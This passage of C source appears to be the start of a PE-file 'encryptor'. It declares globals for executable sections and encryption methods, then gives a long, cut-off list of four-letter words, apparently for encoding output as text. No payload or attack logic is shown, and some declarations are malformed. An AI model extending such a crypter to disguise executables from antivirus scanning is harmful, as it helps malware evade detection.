#include "encryptor.h"
#include <stdlib.h>

CHAR Path[MAX_PATH];
extern pFile *fileList;
extern File _file = { 0 };
extern PE _pe = { 0 };
extern PPE pe = NULL;
extern pFile file;
extern PSECTION section = NULL;
extern int* encryption_methods = NULL;
extern base64 = TRUE;

const char* words[] = {
"aahs", "aals", "aani", "aaru", "abac", "abay", "abas", "abba", "abbe", "abby",
"abbr", "abed", "abey", "abel", "abet", "abib", "abie", "abye", "abir", "abys",
"abit", "able", "ably", "abos", "abow", "abox", "abri", "absi", "abut", "acad",
"acca", "acce", "acct", "aced", "acer", "aces", "ache", "achy", "acid", "acyl",
"acis", "acle", "aclu", "acme", "acne", "acop", "acor", "acpt", "acre", "acta",
"actg", "acts", "actu", "acus", "adad", "adai", "aday", "adam", "adar", "adat",
"adaw", "adda", "addy", "addn", "addr", "adds", "addu", "aden", "adet", "adib",
"adin", "adit", "adjt", "admi", "adod", "adon", "ador", "ados", "adry", "advt",
"adze", "aeon", "aery", "aero", "aesc", "afar", "afer", "affa", "affy", "afft",
"afro", "agad", "agag", "agal", "agao", "agar", "agas", "agau", "agaz", "agba",
"agcy", "aged", "agee", "agen", "ager", "ages", "aget", "agha", "agib", "agin",
"agio", "agit", "agla", "agly", "agma", "agog", "agon", "agos", "agra", "agre",
"agst", "agua", "ague", "ahab", "ahey", "ahem", "ahet", "ahir", "ahoy", "ahom",
"ahum", "ayah", "aias", "aide", "aids", "aiel", "ayen", "ayes", "ayin", "aile",
"ails", "ayme", "aims", "aine", "ayne", "ains", "aint", "ainu", "aion", "aira",
"aire", "ayre", "airy", "airn", "airs", "airt", "aith", "aits", "aivr", "ajar",
"ajax", "ajee", "ajog", "akal", "akan", "aked", "akee", "akey", "aker", "akha",
"akia", "akim", "akin", "akka", "akov", "akra", "akre", "alae", "alai", "alay",
"alan", "alap", "alar", "alas", "alba", "albe", "albi", "albs", "alca", "alce",
"alco", "aldm", "alea", "alec", "alee", "alef", "alem", "alen", "ales", "alew",
"alex", "alfa", "alga", "algy", "alia", "alya", "alif", "alii", "alin", "alit",
"alix", "alky", "alle", "ally", "allo", "alls", "alma", "alme", "alms", "alod",
"aloe", "alop", "alow", "alps", "also", "alto", "alts", "alum", "alur", "amah",
"amay", "amal", "amar", "amas", "amba", "ambe", "ambo", "amdt", "amel", "amen",
"amex", "amia", "amic", "amid", "amie", "amil", "amyl", "amin", "amir", "amis",
"amit", "amla", "amli", "amma", "ammi", "ammo", "ammu", "amoy", "amok", "amor",
"amos", "amps", "amra", "amus", "anay", "anal", "anam", "anan", "anas", "anat",
"anax", "anba", "anda", "ande", "andi", "andy", "ands", "anes", "anet", "anew",
"anga", "ango", "anil", "anim", "anis", "ankh", "anna", "anne", "anni", "anno",
"anoa", "anon", "anre", "ansa", "ansi", "ansu", "anta", "ante", "anti", "ants",
"antu", "anus", "aoli", "aoul", "apay", "apar", "aped", "aper", "apes", "apex",
"apii", "apio", "apis", "apod", "appd", "appl", "appt", "apse", "apts", "apus",
"aqua", "aquo", "arab", "arad", "arak", "arar", "arba", "arbs", "arca", "arch",
"arco", "arcs", "ardu", "area", "ared", "areg", "aren", "ares", "aret", "arew",
"argh", "argo", "aria", "arya", "arid", "aril", "aryl", "arks", "arle", "army",
"arms", "arna", "arne", "arni", "arow", "arri", "arry", "arse", "arte", "arty",
"arts", "arui", "arum", "arvo", "asak", "asap", "asci", "asea", "asem", "asgd",
"asha", "ashy", "asia", "askr", "asks", "asok", "asop", "asor", "aspy", "asps",
"asse", "assi", "assn", "asst", "asta", "astr", "atap", "atar", "ated", "atef",
"aten", "ates", "atik", "atip", "atis", "atka", "atle", "atli", "atma", "atmo",
"atom", "atop", "atry", "atta", "atte", "atty", "attn", "atua", "atwo", "aube",
"auca", "auge", "augh", "auks", "aula", "auld", "aulu", "aune", "aunt", "aura",
"ausu", "aute", "auth", "auto", "aval", "avar", "avdp", "aver", "aves", "avid",
"avie", "avis", "avys", "avoy", "avos", "avow", "awag", "away", "awan", "awat",
"awed", "awee", "awes", "awfu", "awin", "awls", "awny", "awns", "awol", "awry",
"axal", "axed", "axel", "axer", "axes", "axil", "axin", "axis", "axle", "axon",
"azan", "azha", "azon", "azox", "baal", "baar", "baas", "baba", "babe", "babi",
"baby", "babs", "babu", "bach", "back", "bact", "bade", "bads", "bael", "baff",
"baft", "baga", "bagh", "bago", "bags", "baho", "baht", "baya", "bail", "bain",
"bais", "bays", "bait", "bayz", "baja", "baka", "bake", "baku", "bala", "bald",
"bale", "bali", "balk", "ball", "balm", "balr", "bals", "balt", "balu", "bams",
"bana", "banc", "band", "bane", "bang", "bani", "bank", "bans", "bant", "bapt",
"bara", "barb", "bard", "bare", "barf", "bari", "bark", "barm", "barn", "barr",
"bars", "bart", "baru", "base", "bash", "bask", "bass", "bast", "bate", "bath",
"bats", "batt", "batz", "baud", "bauk", "baul", "baun", "bawd", "bawl", "bawn",
"baze", "bbls", "bchs", "bdft", "bdle", "bdls", "bdrm", "bead", "beak", "beal",
"beam", "bean", "bear", "beat", "beau", "beck", "bede", "beds", "beef", "beek",
"been", "beep", "beer", "bees", "beet", "bego", "begs", "behn", "beid", "bein",
"beys", "beja", "bela", "beld", "bely", "belk", "bell", "bels", "belt", "bema",
"beme", "bena", "bend", "bene", "beng", "beni", "benj", "benn", "beno", "bens",
"bent", "benu", "bere", "berg", "beri", "berk", "berm", "bern", "bert", "besa",
"bess", "best", "beta", "bete", "beth", "bets", "bevy", "bhar", "bhat", "bhil",
"bhoy", "bhut", "bias", "bibb", "bibi", "bibl", "bibs", "bice", "bick", "bide",
"bidi", "bids", "byee", "bien", "bier", "byes", "biff", "biga", "bigg", "bygo",
"bija", "bike", "bikh", "bile", "bilk", "bill", "bilo", "bima", "bind", "bine",
"bing", "binh", "bini", "bink", "bino", "bins", "bint", "biod", "biog", "biol",
"bion", "byon", "bios", "bird", "byre", "biri", "birk", "birl", "byrl", "birn",
"birr", "birt", "bise", "bish", "bisk", "byss", "bist", "bite", "byte", "byth",
"biti", "bito", "bits", "bitt", "biwa", "bixa", "bize", "bizz", "bkcy", "bkgd",
"bklr", "bkpr", "bkpt", "blab", "blad", "blae", "blah", "blay", "blam", "blan",
"blas", "blat", "blaw", "bldg", "bldr", "blea", "bleb", "bled", "blee", "bleo",
"blet", "bleu", "blew", "blin", "blip", "blit", "blob", "bloc", "blok", "blot",
"blow", "blub", "blue", "blup", "blur", "blvd", "boar", "boas", "boat", "boba",
"bobo", "bobs", "boca", "boce", "bock", "bode", "body", "bodo", "bods", "boer",
"boff", "boga", "bogy", "bogo", "bogs", "boho", "boid", "boyd", "boyg", "boii",
"boil", "boyo", "bois", "boys", "bojo", "boke", "boko", "bola", "bold", "bole",
"bolk", "boll", "bolo", "bolt", "boma", "bomb", "bomi", "bona", "bond", "bone",
"bong", "boni", "bony", "bonk", "bono", "bons", "boob", "bood", "boof", "book",
"bool", "boom", "boon", "boor", "boos", "boot", "bops", "bora", "bord", "bore",
"borg", "borh", "bori", "born", "boro", "bors", "bort", "bosc", "bose", "bosh",
"bosk", "bosn", "boss", "bota", "bote", "both", "boti", "bots", "bott", "boud",
"bouk", "boul", "boun", "bour", "bout", "bouw", "bove", "bowe", "bowk", "bowl",
"bown", "bows", "boxy", "boza", "bozo", "brab", "brad", "brae", "brag", "bray",
"bram", "bran", "bras", "brat", "braw", "bred", "bree", "brei", "brey", "bren",
"bret", "brev", "brew", "brid", "brie", "brig", "brim", "brin", "brio", "brit",
"brob", "brod", "brog", "broo", "bros", "brot", "brow", "brrr", "brum", "brut",
"bskt", "btry", "bual", "buat", "buba", "bube", "bubo", "bubs", "buck", "buda",
"bude", "budh", "buds", "buff", "bufo", "bugi", "bugs", "buhl", "buhr", "buys",
"bukh", "bulb", "bulk", "bull", "bult", "bumf", "bump", "bums", "buna", "bund",
"bung", "bunk", "bunn", "buns", "bunt", "buoy", "bura", "burd", "bure", "burg",
"burh", "buri", "bury", "burk", "burl", "burn", "buro", "burp", "burr", "burs",
"burt", "bush", "busy", "busk", "buss", "bust", "bute", "buts", "butt", "buzz",
"caam", "caba", "cabs", "caca", "cace", "caci", "cack", "cade", "cadi", "cady",
"cads", "cafe", "caff", "cafh", "cage", "cagy", "cagn", "caic", "caid", "cain",
"cair", "cays", "cake", "caky", "calc", "calf", "calk", "call", "calm", "calp",
"cals", "calx", "camb", "came", "camp", "cams", "cana", "canc", "cand", "cane",
"cany", "cank", "cann", "cans", "cant", "caon", "capa", "cape", "caph", "capo",
"caps", "cara", "card", "care", "carf", "cary", "cark", "carl", "carn", "caro",
"carp", "carr", "cars", "cart", "casa", "case", "cash", "cask", "cass", "cast",
"cate", "cath", "cats", "cauf", "cauk", "caul", "caum", "caup", "caus", "cava",
"cave", "cavy", "cavu", "cawk", "cawl", "caws", "caza", "ccid", "cckw", "ccws",
"ceca", "cede", "cedi", "cees", "ceil", "ceyx", "ceja", "cele", "cell", "celt",
"cene", "cent", "cepa", "cepe", "ceps", "cera", "cere", "cern", "cero", "cert",
"cess", "cest", "cete", "ceti", "chaa", "chab", "chac", "chad", "chai", "chay",
"chal", "cham", "chan", "chao", "chap", "char", "chat", "chaw", "chee", "chef",
"chem", "chen", "cher", "chet", "chew", "chez", "chia", "chic", "chid", "chih",
"chil", "chin", "chip", "chis", "chit", "chiv", "chmn", "chob", "choy", "chok",
"chol", "chon", "chop", "chou", "chow", "chry", "chub", "chud", "chug", "chum",
"chun", "chut", "cyan", "ciao", "cycl", "cyke", "cill", "cima", "cyma", "cyme",
"cine", "cion", "cipo", "circ", "cire", "cirl", "cise", "cist", "cyst", "cite",
"city", "cyul", "cive", "civy", "cixo", "cize", "clad", "clag", "clay", "clam",
"clan", "clap", "clar", "clat", "claw", "cled", "clee", "clef", "cleg", "clem",
"clep", "clew", "clin", "clio", "clip", "clit", "cliv", "clod", "clof", "clog",
"cloy", "clon", "clop", "clos", "clot", "clou", "clow", "club", "clue", "clum",
"cmdg", "cmdr", "coak", "coal", "coan", "coat", "coax", "cobb", "cobs", "coca",
"coch", "cock", "coco", "coct", "coda", "code", "codo", "cods", "coed", "coef",
"coes", "coff", "coft", "cogs", "coho", "coif", "coil", "coin", "coyn", "coyo",
"coir", "coys", "coit", "coix", "coke", "coky", "cola", "cold", "cole", "coli",
"coly", "colk", "coll", "colp", "cols", "colt", "coma", "comb", "comd", "come",
"coml", "comm", "comp", "comr", "coms", "conc", "cond", "cone", "conf", "cong",
"coni", "cony", "conj", "conk", "conn", "cons", "cont", "conv", "coof", "cook",
"cool", "coom", "coon", "coop", "coos", "coot", "copa", "cope", "copy", "copr",
"cops", "copt", "cora", "cord", "core", "corf", "cory", "cork", "corm", "corn",
"corp", "corr", "cort", "corv", "cose", "cosh", "cosy", "coss", "cost", "cote",
"coth", "coto", "cots", "cott", "coud", "coue", "coul", "coup", "cove", "cowy",
"cowk", "cowl", "cows", "coxa", "coxy", "coze", "cozy", "cpus", "crab", "crag",
"cray", "cram", "cran", "crap", "craw", "crax", "crea", "cree", "cres", "crew",
"crex", "crib", "cric", "crig", "crim", "crin", "crip", "cris", "crit", "croc",
"croh", "croy", "crom", "crop", "crow", "crpe", "crts", "crub", "crud", "crum",
"crup", "crus", "crut", "crux", "crwd", "csch", "csmp", "ctge", "ctrl", "cuba",
"cube", "cubi", "cubs", "cuca", "cuck", "cuda", "cuds", "cued", "cues", "cuff",
"cuya", "cuif", "cuir", "cuit", "cuke", "cull", "culm", "culp", "cult", "cump",
"cuna", "cund", "cunt", "cuon", "cups", "cura", "curb", "curd", "cure", "curf",
"cury", "curl", "curn", "curr", "curs", "curt", "cush", "cusk", "cusp", "cuss",
"cust", "cute", "cuts", "cuve", "cuvy", "cwms", "czar", "dabb", "dabs", "dace",
"dada", "dade", "dado", "dads", "dadu", "daer", "daff", "daft", "dago", "dags",
"dahs", "dail", "dain", "dais", "days", "daks", "dale", "dalf", "dali", "dalk",
"dalt", "dama", "dame", "damn", "damp", "dams", "dana", "dand", "dane", "dang",
"dani", "dank", "daps", "darb", "dard", "dare", "darg", "dari", "dark", "darn",
"darr", "dart", "dase", "dash", "dasi", "data", "date", "dato", "daub", "daud",
"dauk", "daun", "daur", "daut", "dauw", "dave", "davy", "dawe", "dawk", "dawn",
"daws", "dawt", "daza", "daze", "dazy", "dbms", "dbrn", "dcor", "dead", "deaf",
"deal", "dean", "dear", "deas", "debe", "debi", "debs", "debt", "decd", "deck",
"decl", "deco", "deda", "dedd", "dedo", "deed", "deek", "deem", "deep", "deer",
"dees", "defi", "defy", "defs", "deft", "degu", "deia", "deil", "deis", "deys",
"deja", "deke", "dele", "delf", "deli", "dely", "dell", "dels", "deme", "demi",
"demy", "demo", "dene", "deny", "dens", "dent", "depa", "depe", "depr", "dept",
"dere", "derf", "derk", "derm", "dern", "dero", "derv", "desc", "desi", "desk",
"dess", "detd", "deti", "detn", "deul", "deus", "deux", "deva", "deve", "devi",
"devs", "dewy", "dews", "dgag", "dhai", "dhak", "dhal", "dhan", "dhaw", "dhow",
"dyad", "diag", "dyak", "dial", "diam", "dian", "dias", "dyas", "diau", "dibs",
"dice", "dyce", "dich", "dick", "dict", "didy", "didn", "dido", "dieb", "died",
"dyed", "diel", "diem", "dier", "dyer", "dies", "dyes", "diet", "diff", "digs",
"dika", "dike", "dyke", "dill", "dilo", "dime", "dims", "dine", "dyne", "ding",
"dink", "dino", "dins", "dint", "dioc", "diol", "dion", "dipl", "dips", "dipt",
"dird", "dire", "dirk", "dirl", "dirt", "disa", "disc", "dish", "disk", "disp",
"diss", "dist", "dita", "dite", "dits", "ditt", "diva", "dive", "divi", "dixy",
"dizz", "djin", "dlvy", "dmod", "doab", "doat", "dobe", "doby", "dobl", "dock",
"docs", "dodd", "dode", "dodo", "dods", "doeg", "doek", "doer", "does", "doff",
"doge", "dogy", "dogs", "doit", "dojo", "doke", "doko", "dola", "dole", "dolf",
"doli", "doll", "dols", "dolt", "dome", "domy", "domn", "doms", "dona", "done",
"dong", "doni", "donk", "donn", "dons", "dont", "doob", "dook", "dool", "doom",
"doon", "door", "dopa", "dope", "dopy", "dora", "dori", "dory", "dorm", "dorn",
"dorp", "dorr", "dors", "dort", "dosa", "dose", "doss", "dost", "dote", "doth",
"doty", "doto", "dots", "doub", "douc", "doug", "doum", "doup", "dour", "dout",
"doux", "dove", "dowd", "dowf", "dowy", "dowl", "down", "dowp", "dows", "doxa",
"doxy", "doze", "dozy", "drab", "drad", "drag", "dray", "dram", "drat", "draw",
"drch", "dree", "dreg", "drey", "drek", "drew", "drib", "drie", "drip", "drys",
"drof", "droh", "drop", "drou", "drow", "drub", "drug", "drum", "dsri", "duad",
"dual", "duan", "dubb", "dubs", "duce", "duci", "duck", "duco", "ducs", "duct",
"dude", "duds", "duel", "duer", "dues", "duet", "duff", "dugs", "duhr", "duim",
"duit", "duka", "duke", "dulc", "duly", "dull", "dult", "duma", "dumb", "dump",
"dune", "dung", "duny", "dunk", "duns", "dunt", "duos", "dupe", "dups", "dura",
"dure", "durn", "duro", "durr", "dush", "dusk", "dust", "duty", "each", "eadi",
"earl", "earn", "ears", "ease", "easy", "east", "eath", "eats", "eaux", "eave",
"ebbs", "ebcd", "eben", "eboe", "ebon", "ecad", "ecca", "ecce", "ecch", "eccl",
"eche", "echo", "echt", "ecod", "ecol", "econ", "ecru", "ecus", "edam", "edda",
"eddy", "eddo", "edea", "eden", "edge", "edgy", "edhs", "edit", "edna", "educ",
"eely", "eels", "eery", "effs", "efik", "efph", "efts", "egad", "egal", "egba",
"egbo", "eger", "eggy", "eggs", "egis", "egma", "egol", "egos", "egre", "eheu",
"eyah", "eyas", "eide", "eyed", "eyey", "eyen", "eyer", "eyes", "eigh", "eila",
"eild", "eyne", "eyot", "eyra", "eire", "eyre", "eiry", "eyry", "ejam", "ejoo",
"eked", "eker", "ekes", "ekka", "ekoi", "elan", "elds", "elec", "elem", "elev",
"elhi", "elia", "elix", "elks", "ella", "elle", "ells", "elmy", "elms", "elne",
"elod", "elon", "elsa", "else", "elul", "elve", "emda", "emer", "emes", "emeu",
"emic", "emyd", "emil", "emim", "emir", "emys", "emit", "emma", "emmy", "empt",
"emus", "enam", "ency", "encl", "ende", "ends", "ened", "enew", "engl", "engr",
"engs", "enid", "enif", "enki", "enol", "enos", "enow", "ense", "entr", "envy",
"eoan", "eole", "eons", "epee", "epha", "epic", "epil", "epit", "epop", "epos",
"eppy", "eqpt", "eral", "eras", "erat", "erer", "ergo", "ergs", "eria", "eric",
"erie", "erik", "erin", "eris", "eryx", "erke", "erma", "erme", "erne", "erns",
"eros", "errs", "erse", "ersh", "erst", "erth", "eruc", "esau", "esca", "eses",
"esne", "esox", "espy", "esse", "esth", "etas", "etch", "eten", "eths", "etym",
"etna", "eton", "etta", "etua", "etui", "euda", "euge", "eure", "euro", "eval",
"evan", "evap", "evea", "even", "ever", "eves", "evil", "evoe", "ewer", "ewes",
"ewry", "ewte", "exam", "exch", "excl", "exec", "exes", "exit", "exla", "exon",
"exor", "expy", "expo", "expt", "exrx", "exta", "extg", "exul", "ezan", "ezba",
"ezod", "ezra", "faba", "face", "facy", "fack", "fact", "fade", "fady", "fado",
"fads", "faff", "fage", "fags", "fail", "fain", "fair", "fays", "fait", "fake",
"faki", "faky", "fala", "falk", "fall", "falx", "fama", "fame", "famp", "fana",
"fand", "fane", "fang", "fany", "fano", "fans", "fant", "faon", "fard", "fare",
"farl", "farm", "faro", "fart", "fasc", "fash", "fass", "fast", "fate", "fath",
"fats", "faun", "faut", "faux", "favi", "favn", "fawe", "fawn", "faze", "fdub",
"feak", "feal", "fear", "feat", "feck", "fedn", "feds", "feeb", "feed", "feel",
"feer", "fees", "feet", "feff", "fegs", "feif", "feil", "feis", "fele", "fell",
"fels", "felt", "feme", "fend", "fens", "fent", "feod", "ferd", "fere", "ferk",
"fern", "ferr", "fers", "feru", "ferv", "fess", "fest", "feta", "fete", "fets",
"feud", "feus", "fiar", "fiat", "fibs", "fica", "fice", "fyce", "fico", "fict",
"fide", "fido", "fids", "fied", "fief", "fiel", "fife", "fifo", "figo", "figs",
"fiji", "fike", "fyke", "fikh", "fila", "file", "fili", "fill", "film", "filo",
"fils", "filt", "find", "fine", "fini", "fink", "finn", "fino", "fins", "fiot",
"fiqh", "fyrd", "fire", "firy", "firk", "firm", "firn", "firs", "fisc", "fise",
"fish", "fisk", "fist", "fits", "fitz", "five", "fixe", "fixt", "fizz", "flab",
"flag", "flay", "flak", "flam", "flan", "flap", "flat", "flav", "flaw", "flax",
"flea", "fled", "flee", "fley", "flem", "flet", "flew", "flex", "flic", "flip",
"flit", "flix", "flob", "floc", "floe", "flog", "flon", "flop", "flor", "flot",
"flow", "flub", "flue", "flus", "flux", "foal", "foam", "fobs", "foci", "foes",
"foge", "fogy", "fogo", "fogs", "fohn", "foil", "foin", "foys", "fold", "fole",
"folk", "foll", "fond", "fone", "fono", "fons", "font", "food", "fool", "foot",
"fops", "fora", "forb", "ford", "fore", "fork", "form", "fort", "forz", "fosh",
"foss", "foud", "foul", "foun", "four", "fowk", "fowl", "foxy", "fozy", "frab",
"frae", "frag", "fray", "fram", "frap", "frat", "frau", "fred", "free", "frey",
"fren", "freq", "fret", "frib", "frig", "frim", "fris", "frit", "friz", "froe",
"frog", "from", "frot", "frow", "frug", "fruz", "frwy", "fthm", "fubs", "fuci",
"fuck", "fuds", "fuel", "fuff", "fugs", "fugu", "fuye", "fuji", "fula", "fulk",
"full", "fume", "fumy", "fund", "funk", "funs", "funt", "fury", "furl", "furs",
"fusc", "fuse", "fusk", "fuss", "fust", "fute", "fuze", "fuzz", "gabe", "gabi",
"gaby", "gabs", "gade", "gadi", "gads", "gaea", "gaed", "gael", "gaen", "gaes",
"gaet", "gaff", "gaga", "gage", "gags", "gaia", "gail", "gain", "gair", "gays",
"gait", "gala", "gale", "gali", "gall", "galp", "gals", "galt", "galv", "gamb",
"game", "gamy", "gamp", "gams", "gane", "gang", "gant", "gaol", "gaon", "gapa",
"gape", "gapy", "gapo", "gaps", "gara", "garb", "gard", "gare", "garg", "gary",
"garn", "garo", "gars", "gash", "gasp", "gast", "gata", "gate", "gats", "gaub",
"gaud", "gauk", "gaul", "gaum", "gaun", "gaup", "gaur", "gaus", "gaut", "gave",
"gawk", "gawm", "gawn", "gawp", "gaze", "gazi", "gazy", "geal", "gean", "gear",
"geat", "geck", "gedd", "geds", "geed", "geek", "geer", "gees", "geet", "geez",
"gegg", "geic", "gein", "geir", "geld", "gell", "gels", "gelt", "gems", "gena",
"gene", "genl", "gens", "gent", "genu", "geod", "geog", "geol", "geom", "geon",
"gerb", "gere", "gery", "germ", "gers", "gess", "gest", "geta", "gets", "geum",
"ghan", "ghat", "ghee", "gheg", "ghis", "ghuz", "gyal", "gibe", "gybe", "gibs",
"gids", "gied", "gien", "gies", "gift", "giga", "gigi", "gigs", "gila", "gild",
"gile", "gyle", "gill", "gilo", "gils", "gilt", "gimp", "gyms", "gyne", "ging",
"gink", "ginn", "gins", "gype", "gips", "gyps", "gird", "gire", "gyre", "gyri",
"girl", "girn", "giro", "gyro", "girr", "girt", "gise", "gyse", "gish", "gist",
"gite", "gyte", "gith", "give", "gyve", "gizz", "glad", "glam", "glar", "gled",
"glee", "gleg", "gley", "glen", "glew", "glia", "glib", "glyc", "glim", "glyn",
"glis", "glob", "glod", "gloy", "glom", "glop", "glor", "glos", "glow", "glub",
"glue", "glug", "glum", "glut", "gnar", "gnat", "gnaw", "gneu", "gnow", "gnus",
"goad", "goaf", "goal", "goan", "goar", "goas", "goat", "gobi", "goby", "gobo",
"gobs", "gode", "gods", "goel", "goen", "goer", "goes", "goff", "gogo", "gois",
"goys", "gola", "gold", "golf", "goli", "goll", "golo", "golp", "goma", "gome",
"gona", "gond", "gone", "gong", "gony", "gonk", "good", "goof", "goog", "gook",
"gool", "goon", "goop", "goos", "gora", "gorb", "gore", "gory", "gosh", "goss",
"gote", "goth", "goto", "goup", "gour", "gout", "gove", "govt", "gowd", "gowf",
"gowk", "gowl", "gown", "gpad", "gpcd", "gpss", "grab", "grad", "graf", "gray",
"gram", "gras", "grat", "grav", "gree", "greg", "grey", "gres", "gret", "grew",
"grex", "grid", "grig", "grim", "grin", "grip", "gris", "grit", "grog", "gros",
"grot", "grow", "grub", "grue", "gruf", "grum", "grun", "grus", "guam", "guan",
"guao", "guar", "guck", "gude", "gufa", "guff", "gugu", "guha", "guhr", "guib",
"guid", "guys", "gula", "guld", "gule", "gulf", "guly", "gull", "gulo", "gulp",
"guls", "gult", "gumi", "gump", "gums", "guna", "gung", "gunj", "gunk", "gunl",
"guns", "gunz", "gurk", "gurl", "gurr", "gurt", "guru", "gush", "guss", "gust",
"guti", "guts", "gutt", "guze", "gwag", "gwen", "haab", "haaf", "haak", "haar",
"habe", "habu", "hack", "hade", "hadj", "haec", "haed", "haem", "haen", "haes",
"haet", "haff", "haft", "hagi", "hags", "haha", "hahs", "haya", "haye", "haik",
"hail", "hain", "hair", "hays", "hait", "hayz", "haje", "haji", "hajj", "hake",
"hako", "haku", "hala", "hale", "half", "hall", "halm", "halo", "halp", "hals",
"halt", "hame", "hami", "hams", "hand", "hang", "hank", "hano", "hans", "hant",
"hapi", "haps", "hapu", "harb", "hard", "hare", "hark", "harl", "harm", "harn",
"harp", "harr", "hart", "harv", "hash", "hask", "hasn", "hasp", "hast", "hate",
"hath", "hati", "hats", "hatt", "haul", "haum", "haut", "have", "hawk", "hawm",
"haws", "haze", "hazy", "hdbk", "hdkf", "hdlc", "hdwe", "head", "heaf", "heal",
"heap", "hear", "heat", "hebe", "hech", "heck", "hede", "heed", "heel", "heep",
"heer", "heft", "hehe", "heii", "heil", "hein", "heir", "held", "hele", "hell",
"helm", "help", "heme", "heml", "hemp", "hems", "hend", "heng", "hens", "hent",
"hera", "herb", "herd", "here", "hery", "herl", "herm", "hern", "hero", "herp",
"herr", "hers", "hert", "hest", "hete", "heth", "heuk", "hevi", "hewe", "hewn",
"hews", "hewt", "hexa", "hexs", "hgwy", "hick", "hide", "hyde", "hied", "hies",
"high", "hike", "hyke", "hila", "hyla", "hile", "hyle", "hili", "hyli", "hill",
"hilt", "hima", "hymn", "himp", "hind", "hynd", "hine", "hyne", "hing", "hins",
"hint", "hipe", "hype", "hypo", "hips", "hyps", "hypt", "hire", "hiro", "hish",
"hisn", "hiss", "hist", "hyte", "hits", "hive", "hizz", "hler", "hlqn", "hoar",
"hoax", "hobo", "hobs", "hoch", "hock", "hods", "hoed", "hoey", "hoer", "hoes",
"hoga", "hogg", "hogo", "hogs", "hohe", "hohn", "hoho", "hoya", "hoin", "hoys",
"hoit", "hoju", "hoke", "hola", "hold", "hole", "holi", "holy", "holk", "holl",
"holm", "holp", "hols", "holt", "holw", "home", "homy", "homo", "hond", "hone",
"hong", "honk", "hont", "hood", "hoof", "hook", "hool", "hoom", "hoon", "hoop",
"hoot", "hope", "hopi", "hops", "hora", "hore", "hory", "horn", "hors", "hort",
"hose", "hosp", "hoss", "host", "hote", "hoti", "hots", "hour", "hout", "hova",
"hove", "howe", "howf", "howk", "howl", "hows", "hrzn", "htel", "hubb", "hubs",
"huck", "hued", "huey", "huer", "hues", "huff", "huge", "hugh", "hugy", "hugo",
"hugs", "huia", "huic", "huke", "hula", "huly", "hulk", "hull", "hulu", "huma",
"hume", "hump", "hums", "hund", "hung", "hunh", "hunk", "huns", "hunt", "hupa",
"hura", "hure", "hurf", "hurl", "hurr", "hurt", "huse", "hush", "husk", "huso",
"huss", "hust", "huts", "huzz", "hwan", "hwyl", "yaba", "yabu", "yack", "yade",
"yaff", "yagi", "iago", "yaya", "yair", "yaje", "yaka", "yaks", "yalb", "yald",
"yale", "yali", "iamb", "yamp", "yams", "yana", "yang", "yank", "yapa", "yapp",
"yaps", "yarb", "yard", "iare", "yare", "yark", "yarl", "yarm", "yarn", "yarr",
"yaru", "yate", "yati", "yaud", "yaup", "yava", "yawy", "yawl", "yawn", "yawp",
"yaws", "ibad", "iban", "ibex", "ibid", "ibis", "icbm", "iced", "ices", "icho",
"ichs", "ichu", "ycie", "icky", "icod", "icon", "yday", "idea", "idee", "idem",
"ideo", "ides", "idic", "idyl", "idle", "idly", "idol", "yeah", "yean", "year",
"yeas", "yeat", "yech", "yede", "ieee", "yeel", "yees", "yegg", "yeld", "yelk",
"yell", "yelm", "yelp", "yelt", "yeni", "yens", "yeom", "yerb", "yerd", "yere",
"yerk", "yern", "yese", "yeso", "yest", "yeta", "yeth", "yeti", "yett", "yeuk",
"yews", "iffy", "igad", "iglu", "yhwh", "iyar", "yids", "yigh", "yike", "yill",
"yilt", "yins", "yipe", "yips", "yird", "yirk", "yirm", "yirn", "yirr", "yite",
"iiwi", "ijma", "ikan", "ikat", "ikey", "ikon", "ikra", "ilea", "ylem", "ilex",
"ilia", "ilya", "ilka", "ilks", "illy", "ills", "ilot", "ilth", "imam", "iman",
"imbe", "imbu", "ymca", "imer", "imid", "imit", "immi", "immy", "impf", "impi",
"impy", "imps", "impv", "inbd", "inbe", "inby", "inca", "inch", "incl", "incr",
"inde", "indy", "indn", "inez", "infl", "info", "inga", "inia", "init", "inky",
"inks", "inly", "inne", "inns", "inro", "insp", "inst", "inta", "intl", "into",
"intr", "invt", "yobi", "yobs", "yock", "iocs", "iode", "yode", "yodh", "iodo",
"yods", "yoga", "yogh", "yogi", "yoho", "yoyo", "yoke", "yoky", "yoks", "yolk",
"yond", "ione", "ioni", "yoni", "ions", "yont", "yook", "yoop", "yore", "york",
"iota", "yote", "youd", "youl", "youp", "your", "yous", "iowa", "yowe", "yowl",
"yows", "iowt", "yowt", "ipid", "ipil", "ipse", "ipso", "iran", "iraq", "yrbk",
"ired", "ires", "irid", "iris", "irks", "irma", "irok", "iron", "irpe", "isba",
"isdn", "ised", "isis", "isle", "isls", "ismy", "isms", "isnt", "isth", "itai",
"ital", "itch", "itea", "itel", "item", "iten", "iter", "itys", "itll", "itmo",
"itsy", "itza", "yuan", "yuca", "yuch", "yuck", "iuds", "yuft", "yuga", "yuit",
"yuke", "yuki", "yuks", "yule", "yuma", "yurt", "yutu", "iuus", "ivan", "ivin",
"ywca", "iwis", "ywis", "ixia", "ixil", "izar", "izba", "izle", "izzy", "jaap",
"jabs", "jack", "jacu", "jade", "jady", "jaga", "jagg", "jags", "jail", "jain",
"jays", "jake", "jako", "jama", "jamb", "jami", "jams", "jane", "jank", "jann",
"jant", "jaob", "jape", "jara", "jarg", "jark", "jarl", "jarp", "jars", "jasy",
"jasp", "jass", "jasz", "jati", "jato", "jauk", "jaun", "jaup", "java", "jawy",
"jawn", "jawp", "jaws", "jazy", "jazz", "jctn", "jean", "jear", "jeed", "jeel",
"jeep", "jeer", "jees", "jeez", "jefe", "jeff", "jehu", "jell", "jeon", "jere",
"jerk", "jerl", "jerm", "jert", "jess", "jest", "jesu", "jete", "jets", "jeux",
"jewy", "jews", "jger", "jhow", "jhvh", "jiao", "jibb", "jibe", "jibi", "jibs",
"jiff", "jigs", "jill", "jilt", "jimp", "jina", "jing", "jink", "jinn", "jins",
"jinx", "jynx", "jiri", "jism", "jiti", "jiva", "jive", "joan", "jobe", "jobo",
"jobs", "joch", "jock", "jocu", "jodo", "joey", "joel", "joes", "jogs", "john",
"joie", "join", "joys", "joke", "joky", "jole", "joll", "jolt", "jong", "joni",
"jook", "joom", "joon", "jose", "josh", "joss", "jota", "jots", "joug", "jouk",
"joul", "jour", "jova", "jove", "jovy", "jowl", "jows", "jozy", "juan", "juba",
"jube", "juck", "jude", "judy", "judo", "juga", "jugs", "juha", "juju", "juke",
"jule", "july", "jump", "junc", "june", "junk", "juno", "junt", "jupe", "jura",
"jure", "juri", "jury", "just", "jute", "juts", "juza", "kaas", "kabs", "kadi",
